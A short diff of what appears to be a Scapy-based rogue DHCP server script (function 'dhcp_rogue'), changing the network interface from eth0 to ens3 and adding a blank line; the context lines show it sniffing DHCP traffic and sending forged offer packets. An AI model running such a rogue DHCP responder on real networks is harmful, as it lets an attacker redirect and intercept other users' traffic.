@@ -20,7 +20,8 @@ def dhcp_rogue(pkt):
                 "end"
             ])
 
-        sendp(offer_pkt, iface="eth0", verbose=1)
+        sendp(offer_pkt, iface="ens3", verbose=1)
 
 sniff(filter="udp and (port 67 or 68)", prn=dhcp_rogue, iface="ens3")
+
 
